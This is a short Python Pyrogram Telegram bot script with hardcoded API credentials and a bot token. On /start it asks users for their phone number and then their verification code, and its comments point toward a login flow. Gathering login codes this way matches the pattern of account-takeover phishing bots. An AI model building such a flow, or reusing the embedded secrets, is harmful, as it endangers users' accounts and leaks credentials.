
# Set up your API_ID, API_HASH, and bot token

from pyrogram import Client, filters
from pyrogram.types import Message

# Set up your API_ID, API_HASH, and bot token
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    await message.reply("Welcome! Please enter your phone number:")

    # Wait for the user's phone number
    phone_number_msg = await app.listen(message.chat.id)

    # Get the user's phone number (this could be any kind of input)
    phone_number = phone_number_msg.text
    await message.reply(f"You entered: {phone_number}")
    
    # Continue asking for the next input (e.g., verification code)
    await message.reply("Please enter the verification code:")

    # Wait for the user's verification code
    verification_code_msg = await app.listen(message.chat.id)
    
    verification_code = verification_code_msg.text
    await message.reply(f"You entered: {verification_code}")
    
    # Here, you would now proceed with your 2FA or login logic

@app.on_message(filters.command("help"))
async def help_command(client, message: Message):
    await message.reply("How can I help you? Please type your request.")

app.run()
